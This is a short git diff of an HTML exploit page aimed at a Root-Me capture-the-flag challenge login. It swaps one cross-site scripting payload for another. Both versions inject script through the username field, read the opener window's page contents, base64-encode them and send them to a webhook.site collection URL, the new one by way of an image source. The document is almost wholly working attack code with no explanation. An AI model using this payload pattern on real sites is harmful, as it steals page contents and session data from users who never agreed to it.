@@ -1,6 +1,6 @@
 <html>
   <body>
-    V2
+    V3
       <form target="_blank" rel="opener" action="http://challenge01.root-me.org:58003/login" method="post">
         <label>Username</label><br>
         <input id="username" name="username"><br>
@@ -11,7 +11,7 @@
   </body>
 
   <script>
-      var payload = '<script>fetch("https://webhook.site/fef3637b-7d71-46fe-a3d6-c97d49ae5891?body=" + btoa(opener.document.body.innerHTML))</scr' + 'ipt>';
+      var payload = '<img id="crack"><script>document.getElementById("crack").src = "https://webhook.site/fef3637b-7d71-46fe-a3d6-c97d49ae5891?body=" + btoa(opener.document.body.innerHTML)</scr' + 'ipt>';
       var secret = 'osefgros';
 
       document.getElementById('username').value = payload;
